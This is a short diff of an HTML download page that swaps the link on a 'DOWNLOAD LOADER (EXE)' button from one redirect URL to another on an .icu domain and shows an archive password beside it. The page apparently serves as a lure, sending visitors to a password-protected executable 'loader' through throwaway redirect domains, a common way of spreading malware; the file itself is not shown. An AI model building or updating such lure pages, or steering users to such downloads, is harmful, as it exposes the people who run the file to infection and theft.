@@ -17,7 +17,7 @@
 </div>
 
 <div class="download-box">
-<a href="https://www.shawonline.co.za/redirl" class="btn">⬇️ DOWNLOAD LOADER (EXE)</a>
+<a href="https://nowayasap.icu/red" class="btn">⬇️ DOWNLOAD LOADER (EXE)</a>
 <div class="password">Archive password: respocket</div>
 </div>
 
